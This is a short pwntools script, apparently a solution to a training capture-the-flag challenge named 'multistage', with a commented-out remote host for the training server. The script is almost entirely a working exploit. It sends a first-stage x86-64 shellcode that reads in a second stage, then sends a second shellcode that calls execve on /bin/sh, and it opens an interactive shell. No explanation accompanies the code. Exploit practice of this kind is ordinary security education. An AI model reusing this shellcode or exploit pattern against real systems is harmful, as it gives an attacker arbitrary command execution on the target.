from pwn import *
import six

context.terminal = ['tmux', 'splitw', '-h']

#r = remote("training.jinblack.it", 2003)
r = process("./multistage")
gdb.attach(r, """c
""")

print(r.recvuntil("name?\n"))		

shellcode = b"\x48\x31\xC0\x48\x31\xFF\x68\x84\x40\x40\x00\x5E\x6A\x32\x5A\x0F\x05\x90\x90\x90"

r.send(shellcode)

shellcode2 = b"\x6A\x3B\x58\x48\xC7\xC7\x96\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05" + b"/bin/sh\0"

r.send(shellcode2)

r.interactive()
